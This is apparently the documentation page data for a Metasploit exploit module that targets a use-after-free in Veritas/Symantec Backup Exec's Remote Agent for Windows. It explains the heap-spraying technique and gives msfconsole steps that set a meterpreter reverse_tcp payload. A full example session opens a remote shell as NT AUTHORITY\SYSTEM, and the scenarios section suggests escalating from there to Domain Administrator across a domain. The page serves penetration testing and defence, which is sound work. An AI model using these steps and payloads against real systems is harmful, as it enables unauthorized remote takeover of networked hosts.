{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/backupexec/ssl_uaf","result":{"data":{"moduleMetadataJson":{"id":"d6e9af15-4d21-58c9-b969-e8e80340cc82","name":"Veritas/Symantec Backup Exec SSL NDMP Connection Use-After-Free","fullname":"exploit/windows/backupexec/ssl_uaf","description":"This module exploits a use-after-free vulnerability in the handling of SSL NDMP\n        connections in Veritas/Symantec Backup Exec's Remote Agent for Windows. When SSL\n        is re-established on a NDMP connection that previously has had SSL established,\n        the BIO struct for the connection's previous SSL session is reused, even though it\n        has previously been freed.\n\n        This module supports 3 specific versions of the Backup Exec agent in the 14, 15\n        and 16 series on 64-bit and 32-bit versions of Windows and has been tested from\n        Vista to Windows 10. The check command can help narrow down what major and minor\n        revision is installed and the precise of version of Windows, but some other\n        information may be required to make a reliable choice of target.\n\n        NX, ASLR and Windows 8+ anti-ROP mitigations are bypassed. On Windows 8+, it has a\n        reliability of around 85%. On other versions of Windows, reliability is around 35%\n        (due to the need to win a race condition across the network in this case; this may\n        drop further depending on network conditions). The agent is normally installed on\n        all hosts in a domain that need to be backed up, so if one service crashes, try\n        again on another :) Successful exploitation will give remote code execution as the\n        user of the Backup Exec Remote Agent for Windows service, almost always\n        NT AUTHORITY\\SYSTEM.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/windows/backupexec/ssl_uaf","documentationSlug":"/modules/documentation/exploit/windows/backupexec/ssl_uaf"},"documentation":{"html":"<h2 id=\"vulnerability-summary\" style=\"position:relative;\"><a href=\"#vulnerability-summary\" aria-label=\"vulnerability summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability Summary</h2>\n<p>The Backup Exec Remote Agent for Windows is vulnerable to a use-after-free in\nits handling of SSL/TLS-wrapped NDMP connections. If SSL/TLS is established on a\nNDMP connection, ended, and finally re-established, the agent will re-use\npreviously freed SSL/TLS structures. This allows for remote code execution over\nan unauthenticated network connection.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Backup Exec consists of a server component as well as remote agents that are\ninstalled on each host that should be backed up by the server.</p>\n<p>There are remote agents available for a range of data sources, including\noperating-system level agents for Windows and Linux hosts' local filesystems,\napplication-specific agents for Microsoft Exchange, SharePoint, Active\nDirectory, etc., and agents for virtual machines such as VMware or Hyper-V\ninstances. This exploit targets the Windows OS-level remote agents, which are\nthe most common type in a typical Backup Exec deployment on a Windows-based\nnetwork. The agents are installed as services running by default as the\n<code class=\"language-text\">NT AUTHORITY\\SYSTEM</code> user.</p>\n<p>A trial version of Backup Exec can be downloaded from Veritas' website;\ncurrently the download is available\n<a href=\"https://www.veritas.com/trial/en/us/backup-exec-16.html\">here</a>.</p>\n<h2 id=\"vulnerability-description\" style=\"position:relative;\"><a href=\"#vulnerability-description\" aria-label=\"vulnerability description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability Description</h2>\n<p>The agent accepts NDMP connections on TCP port 10000. The vendor-specific\n<code class=\"language-text\">0xF383</code> NDMP packet type allows for NDMP connections to be wrapped in a SSL/TLS\nsession. Sub-type <code class=\"language-text\">4</code> initiates the SSL/TLS handshake; after successfully\ncompleting this the client and server continue the NDMP session through the\nSSL/TLS session.</p>\n<p>The agent makes use of OpenSSL to handle these SSL/TLS sessions. When a SSL/TLS\nsession is created, the agent creates necessary OpenSSL structures, including a\n<code class=\"language-text\">struct BIO</code> from the connection's associated network socket using\n<code class=\"language-text\">BIO_new_socket</code>. Upon the end of the SSL/TLS session, this structure is freed\nby a call to <code class=\"language-text\">BIO_free</code> through a call to <code class=\"language-text\">SSL_free</code>.</p>\n<p>However, if a SSL/TLS connection is then re-established on the same NDMP\nconnection, the previously freed <code class=\"language-text\">BIO</code> is re-used in the new SSL/TLS session\neven though it is no longer allocated. The <code class=\"language-text\">BIO</code> is stored during the first\nconnection setup and then retrieved during second connection setup as a member\nof the <code class=\"language-text\">CSecuritySSLConnection</code> class, despite the call to <code class=\"language-text\">SSL_free</code> previously\nfreeing it. This leads to a use-after-free as the <code class=\"language-text\">BIO</code> contains a pointer to a\nstructure (<code class=\"language-text\">BIO_METHOD *method</code>) of function pointers that are used to perform\noperations such as reading and writing from the wrapped <code class=\"language-text\">BIO</code> object (in this\ncase, the network socket).</p>\n<p>By overwriting the previously allocated <code class=\"language-text\">BIO</code> with controlled data, it is\npossible to gain remote code execution when OpenSSL attempts to call one of\nthese function pointers.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install the Backup Exec server on a host.</li>\n<li>Install the Backup Exec Remote Agent for Windows on another host, either\nmanually or through the server's remote agent installation feature. Note that\nin this contrived test situation you should be sure to let the agent run for\na few minutes before continuing so it can finish initial startup work that\notherwise interferes with the exploit's heap manipulation.</li>\n<li>Start <code class=\"language-text\">msfconsole</code>.</li>\n<li>\n<p>Select the module and configure it with, at minimum, the address of the host\nrunning the remote agent:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">use exploit/windows/backupexec/ssl_uaf\nset RHOST [REMOTE AGENT HOST]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>Check the service is running and potentially vulnerable with the <code class=\"language-text\">check</code>\ncommand.</li>\n<li>Select a target version using <code class=\"language-text\">set target [TARGET]</code>.</li>\n<li>\n<p>Select a payload and its options; for example:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">set payload windows/x64/meterpreter/reverse_tcp\nset LHOST [METASPLOIT HOST]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>Start the exploit using the <code class=\"language-text\">exploit</code> command.</li>\n<li>Hopefully get a <code class=\"language-text\">NT AUTHORITY\\SYSTEM</code> shell :)</li>\n</ol>\n<p>An example session is as follows:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/backupexec/ssl_uaf\nmsf exploit(ssl_uaf) &gt; set RHOST win10\nRHOST =&gt; win10\nmsf exploit(ssl_uaf) &gt; check\n\nHostname: WIN10\nOS type: Windows NT\nOS version: Major Version=10 Minor Version=0 Build Number=14393 ServicePack Major=0 ServicePack Minor=0 SuiteMask=256 ProductType=1 ProcessorType=AMD64\nHost ID: XXXX::XXXX:XXXX:XXXX:XXXX\nVendor: VERITAS Software, Corp.\nProduct: Remote Agent for NT\nRevision: 9.2\n[*] win10:10000 The target appears to be vulnerable.\nmsf exploit(ssl_uaf) &gt; show targets\n\nExploit targets:\n\n   Id  Name\n   --  ----\n   0   Backup Exec 14 (14.1 / revision 9.1), Windows &gt;= 8 x64\n   1   Backup Exec 14 (14.1 / revision 9.1), Windows &gt;= 8 x86\n   2   Backup Exec 14 (14.1 / revision 9.1), Windows &lt;= 7 x64\n   3   Backup Exec 14 (14.1 / revision 9.1), Windows &lt;= 7 x86\n   4   Backup Exec 15 (14.2 / revision 9.2), Windows &gt;= 8 x64\n   5   Backup Exec 15 (14.2 / revision 9.2), Windows &gt;= 8 x86\n   6   Backup Exec 15 (14.2 / revision 9.2), Windows &lt;= 7 x64\n   7   Backup Exec 15 (14.2 / revision 9.2), Windows &lt;= 7 x86\n   8   Backup Exec 16 (16.0 / revision 9.2), Windows &gt;= 8 x64\n   9   Backup Exec 16 (16.0 / revision 9.2), Windows &gt;= 8 x86\n   10  Backup Exec 16 (16.0 / revision 9.2), Windows &lt;= 7 x64\n   11  Backup Exec 16 (16.0 / revision 9.2), Windows &lt;= 7 x86\n\n\nmsf exploit(ssl_uaf) &gt; set target 4\ntarget =&gt; 4\nmsf exploit(ssl_uaf) &gt; set payload windows/x64/meterpreter/reverse_tcp\npayload =&gt; windows/x64/meterpreter/reverse_tcp\nmsf exploit(ssl_uaf) &gt; set LHOST 10.123.1.1\nLHOST =&gt; 10.123.1.1\nmsf exploit(ssl_uaf) &gt; exploit\n\n[*] Started reverse TCP handler on 10.123.1.1:4444\n[*] win10:10000 - Connecting sockets...\n[*] win10:10000 - CA certificate ID = 8120a0e9\n[*] win10:10000 - Getting and handling a certificate signing request...\n[*] win10:10000 - Agent certificate ID = 430b56d0\n[*] win10:10000 - Testing certificate...\n[*] win10:10000 - Spraying TLS extensions...\n[*] win10:10000 - Entering SSL mode on main socket...\n[*] win10:10000 - Spraying TLS extensions...\n[*] win10:10000 - Sending stages 2 to 4...\n[*] win10:10000 - Closing TLS spray sockets...\n[*] win10:10000 - Re-entering SSL mode on main socket...\n[*] win10:10000 - Spraying stage 1...\n[*] win10:10000 - Triggering UAF, attempt 1/50...\n[*] Sending stage (1189423 bytes) to 10.123.1.2\n[*] win10:10000 - Spraying stage 1...\n[*] win10:10000 - Triggering UAF, attempt 2/50...\n[*] Meterpreter session 1 opened (10.123.1.1:4444 -&gt; 10.123.1.2:49748) at 2017-05-23 21:53:07 +1200\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>Apart from the usual exploit module options such as <code class=\"language-text\">RHOST</code>, the module has a\nfew exploit-specific options. These should not normally need to be set or\nchanged from their default values in most situations as the exploit will pick\nsuitable values for them depending on the target selected.</p>\n<p><strong>NumSpraySockets</strong>\nThe number of sockets connected to the remote agent in order to spray stage 1 of\nthe exploit, which should overwrite the freed <code class=\"language-text\">BIO</code>.</p>\n<p><strong>NumTLSSpraySockets</strong>\nThe number of sockets connected to the remote agent in order to spray TLS\nextensions. This is used to massage the low fragmentation heap in order to\nincrease chances of stage 1 successfully overwriting the freed <code class=\"language-text\">BIO</code>.</p>\n<p><strong>NumTriggerAttempts</strong>\nThe number of attempts made to trigger the use-after-free for Windows 8+\ntargets, where it is possible to retry calling the overwritten function pointer\nmultiple times.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>The Backup Exec Remote Agent for Windows is installed on each host that has\nlocal filesystems that should be backed up. These agents listen on the network\nfor NDMP connections (on port 10000), appearing in Nmap scans with scripts\nenabled as follows:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-23 20:47 NZST\nNmap scan report for (...)\nHost is up (0.0035s latency).\nNot shown: 994 filtered ports\nPORT      STATE SERVICE            VERSION\n(...)\n10000/tcp open  ndmp               Symantec/Veritas Backup Exec ndmp (NDMPv3)\n|_ndmp-version: ERROR: Script execution failed (use -d to debug)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>(Note that the <code class=\"language-text\">ndmp-version</code> script fails to execute due to not sending an\n<code class=\"language-text\">NDMP_CONNECT_OPEN</code> request before querying version information with the\n<code class=\"language-text\">NDMP_CONFIG_GET_HOST_INFO</code> request. This exploit module's <code class=\"language-text\">check</code> command will\ncarry this query out successfully.)</p>\n<p>While the exploit is not guaranteed to gain RCE (see the module's description),\nin practise the agent is often widely installed in a Windows domain across a\nrange of hosts (including fileservers and domain controllers). This means\nusually at least one instance of the agent will give a shell on a server where\nit's easy enough to further escalate to Domain Administator from <code class=\"language-text\">SYSTEM</code>.</p>"}}},"pageContext":{"id":"d6e9af15-4d21-58c9-b969-e8e80340cc82"}}}